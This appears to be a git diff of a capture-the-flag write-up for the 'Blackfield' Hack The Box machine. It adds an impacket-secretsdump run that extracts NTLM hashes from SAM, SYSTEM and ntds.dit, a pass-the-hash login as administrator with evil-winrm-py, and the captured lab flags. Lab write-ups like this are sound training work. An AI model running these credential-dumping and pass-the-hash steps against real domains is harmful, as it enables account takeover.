@@ -104,8 +104,6 @@ In this case we also need to create a fitting `krb5.conf`, I used NXC for that:
 
 ```
 ---
-
-### 
 ### SMB Enumeration
 
 ```
@@ -114,7 +112,7 @@ In this case we also need to create a fitting `krb5.conf`, I used NXC for that:
 
 ![](../assets/images/Pasted%20image%2020260123172218.png)
 
-We have 'Read' permissions  for `profiles$` as `Guest`, which is a custom share and worth checking out
+We have 'Read' permissions  for `profiles$` as `Guest`, which is a custom share and worth checking out.
 
 ```
 ❯ smbclient //10.129.229.17/profiles$ -U "Guest"%
@@ -288,8 +286,13 @@ evil-winrm-py PS C:\Users\svc_backup\Documents> download SYSTEM .
 **Step 4: run `impacket-secretsdump` to parse the hives and get the `Administrator` NTLM hash.
 ```bash
 # Command
-
+/home/Yuval/H/Blackfield ❯ impacket-secretsdump LOCAL -sam SAM -security SECURITY -ntds ntds.dit -system SYSTEM 
 ```
+
+![](../assets/images/Pasted%20image%2020260123195429.png)
+
+
+
 <div class="divider divider-root">
     <span class="divider-title">Root Access</span>
     <span class="divider-content">Successfully escalated privileges to root</span>
@@ -298,11 +301,17 @@ evil-winrm-py PS C:\Users\svc_backup\Documents> download SYSTEM .
 ### Root Flag
 
 ```bash
-whoami
-# root
+❯ evil-winrm-py -i 10.129.229.17 -u 'administrator' -H '184fb5e5178480be64824d4cd53b99ee'
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.5.0
 
-cat /root/root.txt
-flag{root_flag_here}
+[*] Connecting to '10.129.229.17:5985' as 'administrator'
+evil-winrm-py PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
+4375a629c7c67c8e29db269060c955cb
+
 ```
 
 ---
@@ -310,19 +319,8 @@ flag{root_flag_here}
 ## Post-Exploitation
 
 **Flags:**
-- User: `flag{user_flag_here}`
-- Root: `flag{root_flag_here}`
----
-## Tools Used
-
-| Tool           | Purpose                | Command/Usage                     |
-| -------------- | ---------------------- | --------------------------------- |
-| nmap           | Port scanning          | `nmap -sC -sV target`             |
-| gobuster       | Directory enumeration  | `gobuster dir -u URL -w wordlist` |
-| burpsuite      | Web traffic analysis   | Interactive                       |
-| linpeas        | Linux enumeration      | `./linpeas.sh`                    |
-| custom exploit | Specific vulnerability | `python3 exploit.py`              |
-
+- User: `3920bb317a0bef51027e2852be64b543`
+- Root: `4375a629c7c67c8e29db269060c955cb`
 ---
 
 ## References
@@ -338,17 +336,17 @@ flag{root_flag_here}
 
 ```mermaid
 graph LR
-    A[Nmap Scan] --> B[Web Enum]
+    A[Nmap Scan] --> B[SMB Enum]
     B --> C[Vuln Discovery]
-    C --> D[Initial Shell]
-    D --> E[User Flag]
-    E --> F[PrivEsc Enum]
-    F --> G[Root Shell]
+    C --> D[Bloodhound]
+    D --> E[Lateral Movement]
+    E --> F[SMB Enum]
+    F --> G[Backup Operator Access]
     G --> H[Root Flag]
 ```
 
 ---
 
-**Pwned on:** [Date Here]  
-**Difficulty Rating:** ⭐⭐⭐⭐⭐ (Personal rating)  
-**Fun Factor:** ⭐⭐⭐⭐⭐ (How enjoyable was it?)
+**Pwned on:** 05/10/2025
+**Difficulty Rating:** ⭐⭐⭐⭐ (Personal rating)  
+**Fun Factor:** ⭐⭐⭐ (How enjoyable was it?)
